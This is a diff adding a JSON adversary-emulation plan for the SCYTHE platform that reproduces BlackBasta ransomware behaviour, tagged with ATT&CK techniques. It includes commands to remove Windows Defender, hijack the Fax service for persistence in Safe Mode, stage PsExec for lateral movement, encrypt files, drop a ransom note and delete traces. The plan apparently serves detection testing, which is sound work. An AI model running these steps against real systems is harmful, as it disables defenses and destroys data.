@@ -1,0 +1,630 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "BlackBasta emulation for Threat Thursday",
+        "display_name": "BlackBasta",
+        "name": "BlackBasta",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Query for initial values"
+            },
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\"",
+                "rtags": [
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"",
+                "rtags": [
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c sc query MpsSvc",
+                "rtags": [
+                    "att&ck-technique:T1007",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c sc query Fax",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1007"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c netsh advfirewall firewall show rule name=\"Remote Desktop - Shadow (TCP-In)\"",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c netsh advfirewall firewall show rule name=\"Remote Desktop - User Mode (UDP-In)\"",
+                "rtags": [
+                    "att&ck-technique:T1016",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c netsh advfirewall firewall show rule name=\"Remote Desktop - User Mode (TCP-In)\"",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\"",
+                "rtags": [
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg query \"HKCU\\Control Panel\\Desktop\"",
+                "rtags": [
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\services\\Fax\"",
+                "rtags": [
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\Fax\"",
+                "rtags": [
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "15": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Do not signature against this scheduled task. It is there to kill the process and return control to the SCYTHE director."
+            },
+            "16": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock {$time = [DateTime]::Now.AddMinutes(2); $hourMinute=$time.ToString(\"HH:mm\"); $action = New-ScheduledTaskAction -Execute 'taskkill' -Argument '/rdpclip.exe'; $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -RunLevel Limited; $settings = New-ScheduledTaskSettingsSet; $settings.Hidden = 'False'; $trigger = New-ScheduledTaskTrigger -Once -At $hourMinute; $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings; Register-ScheduledTask -TaskName 'do_not_signature_SCYTHE' -InputObject $task -Force }",
+                "type": "message"
+            },
+            "17": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "\"C:\\Windows\\System32\\rdpclip.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1563.002"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "time": "240",
+                "type": "delay"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del c:\\windows\\system32\\tasks\\do_not_signature_SCYTHE",
+                "type": "message"
+            },
+            "20": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Reconnaissance"
+            },
+            "21": {
+                "module": "loader",
+                "module_to_load": "processes",
+                "request": "--load processes",
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "62dc619d-529a-441f-87e4-89778eee9587",
+                "module": "processes",
+                "request": "",
+                "rtags": [
+                    "att&ck-technique:T1057"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "module": "loader",
+                "module_to_load": "sysinfo",
+                "request": "--load sysinfo",
+                "type": "message"
+            },
+            "24": {
+                "depends_on": "14ba9c44-45b7-4630-b252-ad578faaeba9",
+                "module": "sysinfo",
+                "request": "",
+                "rtags": [
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "25": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "26": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/BlackBasta/rdp.bat --dest C:\\Users\\Public\\rdp.bat",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "27": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "\"C:\\Users\\Public\\rdp.bat\"",
+                "rtags": [
+                    "att&ck-technique:T1204.002"
+                ],
+                "type": "message"
+            },
+            "28": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/BlackBasta/d.bat --dest C:\\Users\\Public\\d.bat",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "29": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "\"C:\\Users\\Public\\d.bat\"",
+                "rtags": [
+                    "att&ck-technique:T1204.002"
+                ],
+                "type": "message"
+            },
+            "30": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell -c Invoke-Command -ScriptBlock {if (Get-Command Uninstall-WindowsFeature  -errorAction SilentlyContinue) {     Uninstall-WindowsFeature -Name Windows-Defender }}",
+                "rtags": [
+                    "att&ck-technique:T1059.001",
+                    "att&ck-technique:T1562.001"
+                ],
+                "type": "message"
+            },
+            "31": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/BlackBasta/dlaksjdoiwq.jpg --dest %Temp%\\dlaksjdoiwq.jpg",
+                "rtags": [
+                    "att&ck-technique:T1027"
+                ],
+                "type": "message"
+            },
+            "32": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c REG ADD \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d %Temp%\\dlaksjdoiwq.jpg /F",
+                "rtags": [
+                    "att&ck-technique:T1112",
+                    "att&ck-technique:T1027",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "33": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/BlackBasta/fkdjsadasd.ico --dest %Temp%\\fkdjsadasd.ico",
+                "rtags": [
+                    "att&ck-technique:T1027"
+                ],
+                "type": "message"
+            },
+            "34": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c REG ADD \"HKLM\\SOFTWARE\\Classes\\.basta\" /F",
+                "rtags": [
+                    "att&ck-technique:T1112",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "35": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c REG ADD \"HKLM\\SOFTWARE\\Classes\\.basta\\DefaultIcon\" /t REG_SZ /d %Temp%\\fkdjsadasd.ico /F",
+                "rtags": [
+                    "att&ck-technique:T1112",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "36": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/BlackBasta/basta.exe --dest C:\\Users\\Public\\basta.exe",
+                "rtags": [
+                    "att&ck-technique:T1105",
+                    "att&ck-technique:T1204.002"
+                ],
+                "type": "message"
+            },
+            "37": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c sc stop Fax",
+                "rtags": [
+                    "att&ck-technique:T1489",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "38": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\services\\Fax\" /v \"ImagePath\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\basta.exe\" /F",
+                "rtags": [
+                    "att&ck-technique:T1210",
+                    "att&ck-technique:T1112",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "39": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c REG ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\Fax\" /t REG_SZ /d Service /F",
+                "rtags": [
+                    "att&ck-technique:T1112",
+                    "att&ck-technique:T1210",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "40": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c sc start Fax",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1036.004",
+                    "att&ck-technique:T1569.002"
+                ],
+                "type": "message"
+            },
+            "41": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock {$HostIPs=Get-NetIPAddress; foreach ($ip in $HostIPs) { if ($ip.IPAddress -match '^192\\.') { $hostIP = $ip.IPAddress;break }}; $network = $hostIP.Substring(0, $hostIP.LastIndexOf(\".\")); $ips = 1..254 | %{\"$network.$_\"}; echo $ips > C:\\Windows\\ip_list.txt}",
+                "rtags": [
+                    "att&ck-technique:T1049",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "42": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/common_x64/PsExec.exe --dest C:\\Users\\Public\\PsExec.exe",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "43": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--vfs_filepath VFS:/shared/threats/BlackBasta/Invoke-TotalExec.ps1",
+                "rtags": [
+                    "att&ck-technique:T1203",
+                    "att&ck-technique:T1570"
+                ],
+                "type": "message"
+            },
+            "44": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/BlackBasta/Doc1.txt --dest C:\\Users\\Public\\Doc1.txt",
+                "type": "message"
+            },
+            "45": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/BlackBasta/Doc2.txt --dest C:\\Users\\Public\\Doc2.txt",
+                "type": "message"
+            },
+            "46": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/BlackBasta/Doc3.txt --dest C:\\Users\\Public\\Doc3.txt",
+                "type": "message"
+            },
+            "47": {
+                "module": "loader",
+                "module_to_load": "crypt",
+                "request": "--load crypt",
+                "type": "message"
+            },
+            "48": {
+                "depends_on": "ff705b65-037a-4f06-b21e-e74e6cfe32bc",
+                "module": "crypt",
+                "request": "--target C:\\Users\\Public\\Doc1.txt --encrypt --password unicorn --extension .basta",
+                "rtags": [
+                    "att&ck-technique:T1486"
+                ],
+                "type": "message"
+            },
+            "49": {
+                "depends_on": "ff705b65-037a-4f06-b21e-e74e6cfe32bc",
+                "module": "crypt",
+                "request": "--target C:\\Users\\Public\\Doc2.txt --encrypt --password unicorn --extension .basta",
+                "rtags": [
+                    "att&ck-technique:T1486"
+                ],
+                "type": "message"
+            },
+            "50": {
+                "depends_on": "ff705b65-037a-4f06-b21e-e74e6cfe32bc",
+                "module": "crypt",
+                "request": "--target C:\\Users\\Public\\Doc3.txt --encrypt --password unicorn --extension .basta",
+                "rtags": [
+                    "att&ck-technique:T1486"
+                ],
+                "type": "message"
+            },
+            "51": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/BlackBasta/readme.txt --dest \"C:\\Users\\Public\\readme.txt\"",
+                "rtags": [
+                    "att&ck-technique:T1204.002"
+                ],
+                "type": "message"
+            },
+            "52": {
+                "time": "300",
+                "type": "delay"
+            },
+            "53": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEANUP"
+            },
+            "54": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "WMIC PROCESS WHERE Name=\"basta.exe\" CALL Terminate",
+                "rtags": [
+                    "att&ck-technique:T1489"
+                ],
+                "type": "message"
+            },
+            "55": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del C:\\Users\\Public\\rdp.bat",
+                "rtags": [
+                    "att&ck-technique:T1070.004",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "56": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del C:\\Users\\Public\\d.bat",
+                "rtags": [
+                    "att&ck-technique:T1070.004",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "57": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del %Temp%\\dlaksjdoiwq.jpg",
+                "rtags": [
+                    "att&ck-technique:T1070.004",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "58": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del %Temp%\\fkdjsadasd.ico",
+                "rtags": [
+                    "att&ck-technique:T1070.004",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "59": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg delete \"HKLM\\SOFTWARE\\Classes\\.basta\\DefaultIcon\"",
+                "rtags": [
+                    "att&ck-technique:T1112",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "60": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg delete \"HKLM\\SOFTWARE\\Classes\\.basta\"",
+                "rtags": [
+                    "att&ck-technique:T1112",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "61": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del C:\\Users\\Public\\basta.exe",
+                "rtags": [
+                    "att&ck-technique:T1070.004",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "62": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\services\\Fax\"",
+                "rtags": [
+                    "att&ck-technique:T1112"
+                ],
+                "type": "message"
+            },
+            "63": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\Fax\"",
+                "rtags": [
+                    "att&ck-technique:T1112"
+                ],
+                "type": "message"
+            },
+            "64": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del C:\\Windows\\ip_list.txt",
+                "rtags": [
+                    "att&ck-technique:T1070.004",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "65": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del C:\\Users\\Public\\PsExec.exe",
+                "rtags": [
+                    "att&ck-technique:T1070.004",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "66": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del C:\\Users\\Public\\Doc1.basta",
+                "rtags": [
+                    "att&ck-technique:T1070.004",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "67": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del C:\\Users\\Public\\Doc2.basta",
+                "rtags": [
+                    "att&ck-technique:T1070.004",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "68": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del C:\\Users\\Public\\Doc3.basta",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "69": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del C:\\Users\\Public\\readme.txt",
+                "rtags": [
+                    "att&ck-technique:T1070.004",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "70": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del C:\\Windows\\Temp1\\log.info",
+                "type": "message"
+            },
+            "71": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del C:\\Windows\\Temp1\\log.dat",
+                "type": "message"
+            },
+            "72": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c rmdir C:\\Windows\\Temp1",
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
